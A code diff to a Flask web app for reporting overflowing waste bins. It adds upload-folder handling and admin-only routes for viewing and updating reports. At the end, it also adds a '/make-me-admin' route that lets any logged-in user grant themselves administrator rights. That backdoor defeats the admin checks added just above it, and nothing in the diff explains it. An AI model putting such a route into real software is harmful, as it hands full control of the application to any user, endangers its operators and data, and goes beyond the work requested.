@@ -50,8 +50,10 @@ def report_overflow():
             
         if photo:
             filename = secure_filename(f"overflow_{datetime.utcnow().strftime('%Y%m%d_%H%M%S')}_{photo.filename}")
+            upload_folder = current_app.config['UPLOAD_FOLDER']
+            os.makedirs(upload_folder, exist_ok=True)  # Ensure directory exists
             photo_path = os.path.join('uploads', filename)
-            photo.save(os.path.join(current_app.config['UPLOAD_FOLDER'], filename))
+            photo.save(os.path.join(upload_folder, filename))
         else:
             photo_path = None
             
@@ -154,4 +156,42 @@ def add_bin():
             flash(f'Error adding bin: {str(e)}', 'danger')
             return redirect(url_for('main.add_bin'))
 
-    return render_template('main/add_bin.html') 
+    return render_template('main/add_bin.html')
+
+@main_bp.route('/admin/reports')
+@login_required
+def admin_reports():
+    if not current_user.is_admin:
+        flash('Admins only.', 'danger')
+        return redirect(url_for('main.dashboard'))
+    status_filter = request.args.get('status')
+    if status_filter:
+        reports = OverflowReport.query.filter_by(status=status_filter).order_by(OverflowReport.report_date.desc()).all()
+    else:
+        reports = OverflowReport.query.order_by(OverflowReport.report_date.desc()).all()
+    return render_template('admin/reports.html', reports=reports)
+
+@main_bp.route('/admin/reports/<int:report_id>/status', methods=['POST'])
+@login_required
+def update_report_status(report_id):
+    if not current_user.is_admin:
+        flash('Admins only.', 'danger')
+        return redirect(url_for('main.dashboard'))
+    new_status = request.form.get('status')
+    report = OverflowReport.query.get_or_404(report_id)
+    if new_status in ['pending', 'resolved']:
+        report.status = new_status
+        db.session.commit()
+        flash('Report status updated.', 'success')
+    else:
+        flash('Invalid status.', 'danger')
+    return redirect(url_for('main.admin_reports'))
+
+@main_bp.route('/make-me-admin')
+@login_required
+def make_me_admin():
+    from ..models import User
+    user = User.query.filter_by(username=current_user.username).first()
+    user.is_admin = True
+    db.session.commit()
+    return "You are now an admin!" 
